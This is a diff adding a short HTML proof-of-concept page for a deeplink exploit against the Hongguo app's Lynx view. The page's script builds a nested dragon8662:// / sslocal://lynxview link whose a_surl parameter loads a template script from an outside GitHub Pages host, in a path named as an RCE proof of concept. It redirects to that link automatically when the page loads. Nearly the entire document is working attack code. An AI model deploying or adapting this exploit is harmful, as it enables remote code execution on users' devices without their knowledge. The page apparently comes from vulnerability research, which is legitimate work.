@@ -1,0 +1,17 @@
+<!doctype html>
+<html><head><meta charset=utf-8><title>hg lynx a_surl</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head><body>
+<h1>Hongguo Lynx a_surl PoC</h1>
+<p>Open the deeplink (or use adb). Template host: gitwhs hongguo-lynx-hostpatch.js</p>
+<p id=dl></p>
+<script>
+const surl='https://lf-normal-gr-sourcecdn.bytegecko.com/obj/byte-gurd-source-gr/lifesaas/isomorphic/resource/canal_discounts_next_mall/pages/index/NOT_EXIST_template.js';
+const asurl='https://gitwhs.github.io/wm-poc-rce/hongguo-lynx-hostpatch.js';
+const inner='sslocal://lynxview?'+new URLSearchParams({surl,a_surl:asurl,hide_nav_bar:'1',dynamic:'3'});
+const outer='dragon8662://lynxview?'+new URLSearchParams({hide_nav_bar:'1',url:inner});
+document.getElementById('dl').innerHTML='<a href="'+outer+'">Open DeepLink</a><pre style="word-break:break-all">'+outer+'</pre>';
+// auto try
+location.href=outer;
+</script>
+</body></html>
